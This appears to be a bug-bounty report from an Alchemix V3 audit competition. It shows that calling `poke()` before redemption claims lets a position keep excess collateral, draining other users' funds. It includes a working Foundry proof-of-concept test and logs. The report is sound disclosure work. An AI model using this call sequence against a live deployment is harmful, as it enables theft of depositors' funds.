# 58755 sc high users position that are synced at certain times overestimate collateralbalance of the position

**Submitted on Nov 4th 2025 at 11:57:30 UTC by @nvalkov for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58755
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A user’s position that has the internal `_sync()` function triggered at specific times loses less collateral during redemptions. This happens because the amount of collateral removed depends on when `_sync()` is called. Users who trigger it more often (directly or indirectly through `poke()`) can end up with more collateral than others who hold the same position. Over multiple redemptions, this creates an imbalance that leads to protocol insolvency — the recorded collateral in user positions becomes greater than the actual tokens held by the contract.

## Vulnerability Details

When collateral is updated inside `_sync()`, the function calculates how much collateral to remove based on global weights:

```solidity
collateralToRemove = PositionDecay.ScaleByWeightDelta(
    account.rawLocked,
    _collateralWeight - account.lastCollateralWeight
);
account.collateralBalance -= collateralToRemove;
```

Here, `_collateralWeight` is a global value that tracks how much collateral decay has occurred, and `account.lastCollateralWeight` is the user’s last recorded checkpoint. The problem is that this checkpoint is only updated when `_sync()` runs, so the amount of collateral a user loses depends on *when* their position gets synced.

If a user’s position has `_sync()` triggered right before a redemption is claimed, their `lastCollateralWeight` will catch up to the most recent value — meaning they’ll lose **less collateral** compared to positions that haven’t been synced recently. This gives unfair advantage to those who interact more often and causes an increasing mismatch between total user balances and actual collateral in the protocol.

In the test below, both `beef` and `dad` deposited and borrowed the same amount, but only `beef` had their position synced (via `poke()`) before each redemption:

```
collateral beef: 75.4032e18
collateral dad:  74.9999e18
myt tokens inside alchemist: 150e18
collateral available for withdrawal: 150.4032e18
```

As shown, total user collateral (`150.4032e18`) exceeded the actual tokens in the contract (`150e18`), proving that syncing timing allows value to be created out of thin air.

## Impact Details

This issue causes **protocol insolvency** over time. Since users with more frequent `_sync()` updates lose less collateral, the system records more total collateral than it actually holds. Eventually, when users withdraw, there won’t be enough tokens to cover all recorded balances. This leads to unequal treatment between users, loss of fairness, and a potential full insolvency of the protocol’s collateral pool. Furthermore, the user `beef` can withdraw more than they should actually stealing from other users, as the last user withdrawing would not be able to withdraw their full collateral, as it will not be available in the contract.

## Proof of Concept

## Proof of Concept

Add this test `testPokeToIncreaseCollateralValue()` in `AlchemistV3.t.sol`

```solidity
function testPokeToIncreaseCollateralValue() external {
        uint256 amount = 100e18;

        // both beef and dad deposit 100e18, and both mint 50e18 for now, so they have the same positions
        
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenIdBeef, amount / 2, address(0xdad));
        vm.stopPrank();

        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xdad), 0);
        // a single position nft would have been minted to 0xdad
        uint256 tokenIdDad = AlchemistNFTHelper.getFirstTokenId(address(0xdad), address(alchemistNFT));
        alchemist.mint(tokenIdDad, amount / 2, address(0xdad));
        vm.stopPrank();

        // Need to start a transmutator deposit, to start earmarking debt
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), amount / 4);
        transmuterLogic.createRedemption(amount / 4);
        vm.stopPrank();
        vm.roll(block.number + 2_628_000);


        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), amount / 4);
        transmuterLogic.createRedemption(amount / 4);
        vm.stopPrank();
        vm.roll(block.number + 2_628_000);
        
        alchemist.poke(tokenIdBeef);

        
        vm.startPrank(address(anotherExternalUser));
        transmuterLogic.claimRedemption(1);
        vm.stopPrank();

        vm.roll(block.number + 2_628_000);

        alchemist.poke(tokenIdBeef);

        vm.startPrank(address(anotherExternalUser));
        transmuterLogic.claimRedemption(2);
        vm.stopPrank();


        (uint256 collateralBeef, uint256 debtBeef, uint256 earmarkedBeef) = alchemist.getCDP(tokenIdBeef);
        console.log("collateral beef: ", collateralBeef);
        console.log("debt beef: ", debtBeef);
        console.log("earmarked beef: ", earmarkedBeef);

        (uint256 collateralDad, uint256 debtDad, uint256 earmarkedDad) = alchemist.getCDP(tokenIdDad);
        console.log("collateral dad: ", collateralDad);
        console.log("debt dad: ", debtDad);
        console.log("earmarked dad: ", earmarkedDad);

        uint256 actualBalance = IERC20(alchemist.myt()).balanceOf(address(alchemist));
        uint256 collateralForWithdrawal = collateralBeef + collateralDad;

        console.log("actualBalance: ", actualBalance);
        console.log("collateral available for withdrawal: ", collateralForWithdrawal);

    }
```

```
Logs:
  collateral beef:  75403225806451612902
  debt beef:  25000000000000000000
  earmarked beef:  0
  collateral dad:  74999999999999999999
  debt dad:  24999999999999999999
  earmarked dad:  0
  actualBalance:  150000000000000000000
  collateral available for withdrawal:  150403225806451612901
```
